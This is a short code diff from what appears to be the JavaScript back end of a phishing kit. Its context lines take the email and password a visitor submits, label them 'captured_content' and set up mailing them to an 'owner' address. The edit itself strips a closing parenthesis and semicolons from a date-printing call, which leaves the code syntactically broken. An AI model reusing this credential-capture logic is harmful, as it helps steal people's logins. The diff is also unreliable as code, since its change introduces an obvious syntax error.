@@ -58,8 +58,8 @@ const decryptedPass = cryptr.decrypt(encryptedPass);
  
  
  let d = new Date()
- d.format("yyyy/mm/dd");
- console.log(d);
+ d.format("yyyy/mm/dd"
+ console.log(d)
  
     var captured_content = `\n Email: ${req.body.email} Password: ${encryptedPass}`;
     let toMail = req.body.owner;
